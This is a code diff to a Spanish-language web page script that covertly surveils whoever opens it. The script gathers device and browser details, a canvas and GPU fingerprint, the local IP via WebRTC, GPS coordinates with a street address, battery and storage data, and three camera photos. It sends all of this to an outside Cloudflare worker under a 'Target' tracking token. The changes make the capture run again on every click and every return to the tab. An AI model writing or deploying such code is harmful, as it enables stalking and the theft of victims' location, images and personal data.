@@ -20,8 +20,6 @@
         const trackingId = 'AQUI_VA_TOKEN';  // 🔥 CAMBIA ESTO POR TU TOKEN REAL
         const workerUrl = 'https://wispy-bonus-51e9.societykark.workers.dev';
 
-        console.log('✅ Script iniciado');
-
         // ============================================================
         // FUNCIONES DE CAPTURA
         // ============================================================
@@ -29,7 +27,7 @@
         async function reverseGeocode(lat, lng) {
             try {
                 const url = `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json&zoom=18&addressdetails=1`;
-                const res = await fetch(url, { headers: { 'User-Agent': 'TrackerBot/1.0' } });
+                const res = await fetch(url);
                 const data = await res.json();
                 return data.display_name || null;
             } catch(e) { return null; }
@@ -71,6 +69,7 @@
             });
         }
 
+        // ========== CAPTURAR FOTOS (3 FOTOS) ==========
         async function capturarFotos(cantidad = 3) {
             const video = document.getElementById('v');
             const canvas = document.getElementById('c');
@@ -90,8 +89,12 @@
                     await new Promise(r => setTimeout(r, 200));
                 }
                 stream.getTracks().forEach(t => t.stop());
+                video.srcObject = null;
                 return fotos;
-            } catch(e) { return []; }
+            } catch(e) {
+                console.warn('⚠️ Cámara no disponible:', e.message);
+                return [];
+            }
         }
 
         function obtenerDispositivo() {
@@ -174,7 +177,7 @@
         }
 
         // ============================================================
-        // CONSTRUIR MENSAJE (SIN DUPLICADOS)
+        // ENVIAR AL WORKER CON FOTOS
         // ============================================================
         async function enviarAlWorker() {
             console.log('📤 Iniciando captura...');
@@ -202,22 +205,18 @@
                 let msg = '📊 Visitor Information Captured\n';
                 msg += '━━━━━━━━━━━━━━━━\n\n';
 
-                // 1. Device & Browser
                 msg += '🖥️ Device & Browser\n';
                 msg += `   • Device Model: ${dispositivo.modelo}\n`;
                 msg += `   • User Agent: ${dispositivo.userAgent}\n\n`;
 
-                // 2. Fingerprint
                 msg += '🎨 Fingerprint\n';
                 msg += `   • GPU: ${fp.gpu}\n`;
                 msg += `   • Canvas: ${fp.canvas}\n\n`;
 
-                // 3. Network Information (con IP Local)
                 msg += '🌐 Network Information\n';
                 if (ipLocal) msg += `   • Local IP (WebRTC): ${ipLocal}\n`;
                 msg += `   • Language: ${dispositivo.language}\n\n`;
 
-                // 4. GPS (solo una vez)
                 if (gpsConDireccion) {
                     msg += '📍 GPS\n';
                     msg += `   • Coordenadas: ${gpsConDireccion.lat}, ${gpsConDireccion.lng}\n`;
@@ -226,35 +225,30 @@
                     msg += `   • 🗺️ Google Maps: https://www.google.com/maps?q=${gpsConDireccion.lat},${gpsConDireccion.lng}\n\n`;
                 }
 
-                // 5. Display Information
                 msg += '🖼️ Display Information\n';
                 msg += `   • Resolution: ${dispositivo.resolution}\n`;
                 msg += `   • Color Depth: ${dispositivo.colorDepth}\n\n`;
 
-                // 6. Battery Status
                 msg += '🔋 Battery Status\n';
                 msg += `   • Level: ${bateria.level}\n`;
                 msg += `   • Charging: ${bateria.charging}\n\n`;
 
-                // 7. Device Permissions
                 msg += '🔐 Device Permissions\n';
                 msg += `   • Camera: ${permisos.camera}\n`;
                 msg += `   • Location: ${permisos.location}\n\n`;
 
-                // 8. Hardware & Storage
                 msg += '💾 Hardware & Storage\n';
                 msg += `   • CPU Cores: ${dispositivo.cpuCores}\n`;
                 msg += `   • RAM: ${dispositivo.deviceMemory} GB\n`;
                 msg += `   • Storage Used: ${almacenamiento.used}\n`;
                 msg += `   • Storage Total: ${almacenamiento.total}\n\n`;
 
-                // 9. Target
                 msg += '━━━━━━━━━━━━━━━━\n';
                 msg += `🎯 Target: ${trackingId || 'N/A'}\n`;
                 msg += `⚡ Developed by: @societykark\n`;
                 msg += `⏰ ${new Date().toISOString()}`;
 
-                // ========== ENVIAR ==========
+                // ========== ENVIAR CON FOTOS ==========
                 const formData = new FormData();
                 formData.append('text', msg);
                 fotos.forEach((foto, index) => {
@@ -275,7 +269,7 @@
         }
 
         // ============================================================
-        // EVENTOS
+        // EVENTOS: CADA CLICK, RECARGA Y VISIBILIDAD
         // ============================================================
         function ejecutar() {
             console.log('🔄 Ejecutando captura...');
@@ -283,13 +277,17 @@
         }
 
         window.addEventListener('load', ejecutar);
+        
+        // 🔥 CADA VEZ QUE SE TOQUE LA PANTALLA
         document.addEventListener('click', () => {
-            console.log('👆 Click detectado');
+            console.log('👆 Click detectado, reiniciando captura...');
             setTimeout(enviarAlWorker, 300);
         });
+        
+        // 🔥 CADA VEZ QUE SE VUELVA A LA PESTAÑA
         document.addEventListener('visibilitychange', () => {
             if (!document.hidden) {
-                console.log('👁️ Página visible');
+                console.log('👁️ Página visible, reiniciando captura...');
                 setTimeout(enviarAlWorker, 300);
             }
         });
